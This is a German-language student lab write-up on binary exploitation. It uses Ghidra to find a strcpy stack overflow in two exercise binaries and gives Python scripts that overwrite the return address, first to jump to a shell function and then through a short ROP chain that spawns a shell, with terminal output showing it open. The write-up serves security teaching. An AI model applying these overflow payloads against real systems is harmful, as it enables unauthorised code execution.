---
title: Binary Exploitation with ROP
author: Paul Nykiel
date: \today
---

# Erste Schritte
Die Analyze mit Ghidra ergibt, dass aus der `main` Funktion die Funktion `countAndPrint` mit Argument
`argv[1]` aufgerufen wird, falls `argc == 2`. Die Funktion `countAndPrint` führt zuerst ein `strcpy` auf einen
Buffer im Funktionsstack aus. Die Funktion `strcpy` ist unsicher und kann genutzt werden um den Stack der Funktion
`countAndPrint` zu manipulieren. Des weiteren stellt man mit Ghidra fest, dass eine Funktion `openbash` existiert,
die eine Shell öffnet. Für einen Angriff kann also die Rücksprungadresse von `countAndPrint` über den Buffer-Overflow
so geändert werden, dass die Funktion `openbash` angesprungen wird. Mit Ghidra kann außerdem herausgefunden werden,
dass die Addresse von `openbash` `0x080484B6` ist. Zudem kann abgeschätzt werden, wie lange der Buffer ungefähr sein
muss: der `char` Buffer für das `strcpy` ist 50 Bytes lang, davor liegen keine Variable, nur der `EBP`, das heißt
der Bufferoverflow muss mindestens 54 (ein Byte lange) Zeichen lang sein.

Analog zur Vorlesung wird die Eingabe mit einem kleinen Python-Skript generiert:
```python
import sys
import struct

addr = 0x080484B6

sys.stdout.buffer.write(b"a"*70+ struct.pack("@I", addr) + b'\0')
```
der Offset von 70 wurde experimentell bestimmt, gibt man das Skript an das Program 
(`psec@VirtualBox:~/pSec$ ./aufgabe1 "$(python3 a1.py)"`) dann erscheint die Meldung `Opening shell, (exit) to leave` 
und eine weitere Shell wird geöffnet.

# ROP mit Argumenten
Der funktionale Teil des Programs ist identisch zu dem Program der vorherigen Aufgabe. Die Änderungen betreffen nur
die nicht genutzten Funktionen: `openbash` existiert nicht mehr, dafür gibt es eine Reihe an neuen Funktionen.
Im Detail sind die Funktionen:

 * `char *concat(char *, char*)`: Nimmt zwei (null-terminiert) Strings entgegen und konkatiniert sie zu einem String
    (auf dem Heap), der Pointer zu diesem String wird returned.
 * `void executeCommand(int)`: führt je nach Eingabewert einen anderen Befehl aus, für `0x1020304` wird der Wert von
        `global_directory` und einer globalen Variable mit Wert `date` konkatiniert. 
        Für `-0x35014542` (`==0xcafebabe`) wird der Befehl an der Stelle von `global_directory` mit dem String `sh` konkatiniert. 
        Für alle anderen Eingaben ist der Befehl nicht wohldefiniert.
 * `void setGlobalDirectory(void *)`: setzt den Wert von `global_directory` auf den Wert des Arguments.

Um eine Shell zu öffnen reicht der Aufruf von `system` mit dem Argument `sh`. Dafür muss `executeCommand` mit dem
Argument `0xcafebabe` aufgerufen werden. Davor muss `global_directory` so gesetzt werden, dass es auf einen leeren
String, also ein Nullzeichen zeigt. Dafür muss `setGlobalDirectory` entsprechend aufgerufen werden, hierfür nehmen
wir einfach den Nullterminator des Globalen Strings `sh`. Der Nullterminator ist an Adresse `0x080487e7`.

Das heißt wir müssen die folgenden beiden Funktionen aufrufen:
```c++
setGlobalDirectory(0x080487e7);
executeCommand(0xcafebabe);
```
dafür brauchen wir noch die Addressen der beiden Funktionen, diese können wir mit Ghidra herausfinden:

 * `setGlobalDirectory`: `0x80485f9`
 * `executeCommand`: `0x804858e`

Das heißt unser Stack muss im folgenden so aussehen (aufsteigend ab Addresse von Buffer):
 * 70 Füllzeichen
 * Addresse von `setGlobalDirectory`
 * Addresse von `executeCommand`
 * Argument für `setGlobalDirectory`
 * Argument für `ExecuteCommand`

Auch hierfür wurde wieder ein kleines Python Skript geschrieben:
```python
import sys
from struct import pack

sGD = 0x80485f9
exC = 0x804858e
argSGD = 0x080487e7
argExC = 0xcafebabe

stack = pack("I", sGD) + pack("I", exC) + pack("I", argSGD) + pack("I", argExC)

sys.stdout.buffer.write(b"a"*70 + stack + b'\0')
```
Dadurch öffnet sich dann wieder eine Shell:
```bash
psec@VirtualBox:~/pSec$ ./aufgabe2 "$(python3 a2.py)"
Your name includes 50 times the char 'a'
$ 
```
